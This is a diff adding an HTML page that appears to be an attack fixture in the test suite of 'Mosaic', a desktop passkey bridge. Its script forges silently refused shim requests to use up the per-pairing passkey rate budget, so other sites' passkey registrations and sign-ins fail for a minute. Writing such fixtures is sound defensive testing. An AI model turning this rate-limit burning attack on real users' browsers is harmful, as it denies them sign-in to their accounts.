@@ -1,0 +1,56 @@
+<!-- attempts: spend the desktop's per-pairing passkey budget (passkeyCreate 3 and passkeyGet 10 a minute) with forged
+     shim requests that the desktop refuses silently (no ES256, no passkey of Mosaic's), so that another site's
+     registration or sign-in fails outright for the next minute instead of reaching the browser's own WebAuthn. -->
+<!doctype html>
+<meta charset="utf-8">
+<title>Passkey budget burner</title>
+<script src="/_leaks.js"></script>
+<h1>Nothing to see</h1>
+<script>
+  const CHALLENGE = "AAAAAAAAAAAAAAAAAAAAAA";
+  const forged = (id, op) =>
+    op === "create"
+      ? {
+          type: "mosaic-passkey-req",
+          id,
+          op,
+          // RS256 only: the desktop answers passkeyUnsupported without a dialog.
+          options: {
+            rpId: null,
+            userId: "AQID",
+            userName: "x",
+            userDisplayName: "x",
+            challenge: CHALLENGE,
+            algorithms: [-257],
+            excludeCredentials: [],
+            userVerification: "preferred",
+          },
+        }
+      : // No passkey of Mosaic's for this site: passkeyNotFound without a dialog.
+        { type: "mosaic-passkey-req", id, op, options: { rpId: null, challenge: CHALLENGE, allowCredentials: [], userVerification: "preferred" } };
+
+  /** Sends one forged request and waits for its answer (one at a time stays inside the bridge's cap and the router's rate). */
+  const one = (id, op) =>
+    new Promise((resolve) => {
+      const listener = (event) => {
+        if (event.source === window && event.data?.type === "mosaic-passkey-res" && event.data.id === id) {
+          removeEventListener("message", listener);
+          resolve(event.data.result);
+        }
+      };
+      addEventListener("message", listener);
+      postMessage(forged(id, op), "*");
+      setTimeout(() => resolve({ kind: "timeout" }), 3000);
+    });
+
+  /** Spends `creates` registrations and `gets` sign-ins of the budget; returns what the bridge answered. */
+  window.burn = async (creates, gets) => {
+    const answers = [];
+    let id = 1000;
+    for (const op of [...Array(creates).fill("create"), ...Array(gets).fill("get")]) {
+      answers.push(await one(id++, op));
+      await new Promise((resolve) => setTimeout(resolve, 150));
+    }
+    return answers;
+  };
+</script>
